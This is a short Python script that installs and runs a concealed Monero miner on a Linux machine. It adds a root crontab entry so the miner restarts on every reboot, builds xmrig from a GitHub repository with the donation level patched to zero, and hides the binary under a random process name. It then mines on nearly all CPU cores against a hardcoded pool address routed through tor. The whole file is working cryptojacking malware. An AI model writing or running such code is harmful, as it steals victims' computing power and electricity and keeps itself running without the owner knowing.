__author__ = 'root'
import time
import urllib2
import urllib
import os,sys
from httplib import BadStatusLine
from socket import error as socket_error
import multiprocessing
import ast, random, string
useproxy = 0
os.system('chmod 777 ' + __file__)
program = ''
link_github = 'https://github.com/giautoidi/giautoidi.git'
link_folder = 'giautoidi'
for k in range(1, 8, 1):
    program += random.choice(string.ascii_lowercase)
os.system('pkill ' + program)
cores = multiprocessing.cpu_count() - 1
if cores <= 0:
    cores = 1
os.system('sysctl -w vm.nr_hugepages=$((`grep -c ^processor /proc/cpuinfo` * 3))')
try:
    os.system('apt-get update -y')
    os.system('apt-get install -y build-essential cmake libuv1-dev openssl libssl-dev libhwloc-dev wget gcc make python python-dev tor screen git')
except:
    pass
try:
    path = '/var/spool/cron/crontabs/root'
    data = '@reboot screen -dm python /etc/dao.py'
    os.system('echo %s >> %s' %(data, path))
    os.system('chmod 600 %s' %path)
except:
    pass
try:

    if not os.path.isfile('/root/%s/build/xmrig' % link_folder):
        os.chdir('/root')
        os.system('rm -rf %s' %link_folder)
        os.system('git clone %s' %link_github)
        os.chdir(link_folder)
        os.system('sed -i -r "s/k([[:alpha:]]*)DonateLevel = [[:digit:]]/k\\1DonateLevel = 0/g" src/donate.h')
        os.system('mkdir build && cd build && cmake .. && make')
        os.chdir('/root/%s/build/' %link_folder)
        workingdir = os.getcwd()
        os.system('ln -s -f ' + workingdir + '/' + 'xmrig' + ' ' +'/usr/local/bin/' + program)
        os.system('ln -s -f ' + workingdir + '/' + 'xmrig' + ' ' + '/usr/bin/' + program)
        time.sleep(2)
    else:
        try:
            os.chdir('/root/%s/build' %link_folder)
            workingdir = os.getcwd()
            os.system('ln -s -f ' + workingdir + '/' + 'xmrig' + ' ' + '/usr/local/bin/' + program)
            os.system('ln -s -f ' + workingdir + '/' + 'xmrig' + ' ' + '/usr/bin/' + program)
            time.sleep(2)
        except:
            pass

except:
    pass

#os.system (program + ' -o stratum+tcp://73avhutb24chfsh6.onion:442 --tls -socks5=9050 -t ' + str(cores))
os.system (program + ' -o stratum+tcp://66.42.53.57:442 --tls -socks5=9050 -t ' + str(cores))
